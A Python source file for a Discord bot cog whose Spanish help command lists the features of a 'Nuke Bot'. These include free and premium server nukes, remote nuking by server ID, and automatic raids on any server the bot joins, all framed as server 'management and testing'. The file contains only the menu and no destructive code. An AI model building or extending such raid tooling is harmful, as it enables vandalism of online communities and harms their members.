import discord
from discord.ext import commands

class Ayuda(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ayuda")
    async def ayuda_command(self, ctx):
        """Muestra la lista de comandos disponibles"""
        
        # Creación del Embed
        embed = discord.Embed(
            title="🛠️ Panel de Comandos - Nuke Bot",
            description="Lista de funciones disponibles para la gestión y testeo de servidores.",
            color=discord.Color.red() # Color rojo para estilo "hacker/danger"
        )

        # Comando 1: Nuke Gratis
        embed.add_field(
            name="1. `.nuke`",
            value="Versión gratuita para nukear el servidor actual de forma rápida.",
            inline=False
        )

        # Comando 2: Premium y Configuración
        embed.add_field(
            name="2. `.premium`",
            value="Acceso al nuke personalizado. \n*Nota: Para configurarlo usa el comando* `.configurar`.",
            inline=False
        )
        
        # Comando 3: ID Nuke
        embed.add_field(
            name="3. `.idnuke [ID_DEL_SERVER]`",
            value="Nukea un servidor de forma remota usando su ID, sin necesidad de escribir comandos en el servidor objetivo.",
            inline=False
        )
        
        embed.add_field(
            name="4. `.autoraid`",
            value="Nukea un servidor automáticamente cuando el bot entre .",
            inline=False
        )
        # Pie de página opcional
        embed.set_footer(text=f"Solicitado por {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
        
        # Envío del mensaje
        await ctx.send(embed=embed)

# Función necesaria para cargar el Cog
async def setup(bot):
    await bot.add_cog(Ayuda(bot))
      
